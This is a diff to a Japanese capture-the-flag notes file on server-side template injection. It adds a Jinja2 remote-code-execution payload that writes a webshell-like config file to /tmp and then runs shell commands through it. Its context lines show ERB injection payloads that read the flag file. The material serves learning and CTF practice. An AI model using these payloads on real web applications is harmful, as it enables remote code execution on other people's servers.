@@ -1035,11 +1035,26 @@ curl -v http://192.168.99.100:4567/add -d "memo=1%0A%3C%25%3D%20require%20'net%2
 ```
 他にも、``<% abort `cat flag` %>``としてabortに引数として文字列を与えると、それをエラーメッセージとして表示するらしい。   
 また、``<% session[:memos].push `cat flag` %>``でセッションにflagを保存することもできるらしい。   
-## sample
+## jinja2 RCE through __class__.__mro__ (BSidesSF CTF 2017)
+https://jtwp470.hatenablog.jp/entry/2017/02/15/002304#Zumbo-3-250-pt   
 - **entrypoint**    
+FlaskのJinja2のtemplate変数に`{{  }}`を挿入できるので脆弱！   
 - **概要**    
+以下が脆弱な箇所。   
+```python
+template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
+```
+jinja2のRCEには以下が参考。   
+http://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/   
+https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/   
 - **Payload**    
+```txt
+// これでWebshell的なものをサーバー上に用意する
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/mocho.cfg', 'w').write('from subprocess import check_output;RUNCMD = check_output') }}
 
+// これで任意コマンドを送信したら実行できる
+{{ config['RUNCMD']('/usr/bin/curl http://vault:8080/flag',shell=True) }}
+```
 ## sample
 - **entrypoint**    
 - **概要**    
